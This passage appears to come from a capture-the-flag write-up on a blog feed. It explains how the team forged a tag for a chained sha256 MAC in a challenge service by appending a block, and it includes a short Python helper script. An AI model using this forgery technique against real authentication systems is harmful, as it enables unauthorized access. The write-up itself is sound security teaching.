|   tag<em>i = sha256(k || M</em>i ^ tag_i-1)                 |
|                                                      |
| FUNCS:                                               |
|   start : start session                              |
|   genrnd: get random numer                           |
|   time  : get time                                   |
|   list  : list files                                 |
|   put   : put file                                   |
|   get   : get file                                   |
|   auths : server authentication                      |
|   authc : client authentication                      |
|                                                      |
| NOTE:                                                |
|   session times out                                  |
|   connection limit                                   |</p>

<hr>

<p>```</p>

<p>Calling the start function gives us a session ID and a nonce:</p>

<p>```</p>

<p>\r\nUse ID: 688383258476362303\r\nUse Nonce: 2bH5BJ5gR4FPnw8JIPvMgw== to xor your key!\r\n'</p>

<p>```
It became apparent that we needed to authenticate to the server by calling authc(id, msg, iv, tag) where msg is a base64-encoded raw message, the iv we used, and the tag of the message as generated by the algorithm in &quot;SPEC&quot; of the help response.
Auths(id, msg) would return an iv and tag of msg, but when we try to feed this output directly into authc(), we receive:</p>

<p>```</p>

<p>u'IV : eDmGlE34dc6xjskpRtaCQg==\r\nMsg: YmxhaA==\r\nTag: GGzDwlaGGl+MBlMO2Svbmw==\r\n'
u'Please choose another message!\r\n'
```
Next, we tried exploiting the fact that, given the algorithm they are using, we could flip a bit in the first block of the message and flip the corresponding bit in the IV without affecting the tag of the message. So we gave auths() the msg in the first line below, and then flipped a bit in the provided IV and in the original msg (line 2). We gave this to authc() and received line 3.</p>

<p>```</p>

<p>u'IV : JNuQTRBq+1uYePtwjyt8KQ==\r\nMsg: AAAAAAAAAAAAAAAAAAAAAA==\r\nTag: 78Eb6hYOZFu4yOGNVWxjDQ==\r\n'
&quot;215791365151423835&quot;, 'AQAAAAAAAAAAAAAAAAAAAA==', 'JduQTRBq+1uYePtwjyt8KQ==', '78Eb6hYOZFu4yOGNVWxjDQ=='
u'Please choose a different message length (blocks: 1)!\r\n'</p>

<p>```</p>

<p>Now we knew that the message we give to authc() needs to be of different length than the one we give to auths(). Finally, we saw that we could extend the message in the following way:</p>

<p>```</p>

<p>if M<em>i = M</em>0 ^ iv ^ tag<em>0
 then tag</em>1 = sha256(k || M<em>i ^ tag</em>0) = sha256(k || M<em>0 ^ iv ^ tag</em>0 ^ tag<em>0) = tag</em>0</p>

<p>```</p>

<p>So, we generated the following from auths() using a message block of all 0's:</p>

<p>```</p>

<p>u'IV : qyvebQDUhwtfPApJ/liLzQ==\r\nMsg: AAAAAAAAAAAAAAAAAAAAAA==\r\nTag: HBF3ALjqxh6DncNXUxU8EA==\r\n'</p>

<p>```</p>

<p>and then we could append a second block onto our message, M<em>1 = M</em>0 ^ iv ^ tag. Giving this longer message to authc() along with the same tag and iv yielded authentication:1.</p>

<p>We then simply needed to call list() and decode the response to get the name of the file containing the flag, secret.txt. We then encoded secret.txt and sent the get(id, file) command, which returned the flag:</p>

<p>u'flag{c6Lnm39r950dlh6WzeIN}\n'</p>

<p>helpful script:
```python
import base64</p>

<p>def flip_bit(msg):
  s = bytearray(base64.b64decode(msg))
  s[0] = s[0] ^1
  return base64.b64encode(s)</p>

<p>def xor(m1, m2):
  s1 = bytearray(base64.b64decode(m1))
  s2 = bytearray(base64.b64decode(m2))
  return base64.b64encode(bytearray(x^y for x,y in zip(s1,s2)))</p>

<p>def cat(m1,m2):
  s1 = bytearray(base64.b64decode(m1))
  s2 = bytearray(base64.b64decode(m2))
  return base64.b64encode(s1+s2)</p>

<h1>u'IV : EgPPG3/6IoWYHDK7/ySL1g==\r\nMsg: AAAAAAAAAAAAAAAAAAAAAA==\r\nTag: 31HfnMcBiAZj8CgMaZC78w==\r\n'</h1>

<h1>want msg = (M<em>0 || M</em>0 ^ iv ^ tag_0)</h1>

<h1>return msg, iv, tag</h1>

<p>def mk<em>params(iv, msg, tag):
  m</em>i = cat(msg, xor(xor(msg, iv), tag) )
  print &quot;'%s', '%s', '%s'&quot;%(m_i, iv, tag)
```</p>
]]></content>
  </entry>
  
</feed>
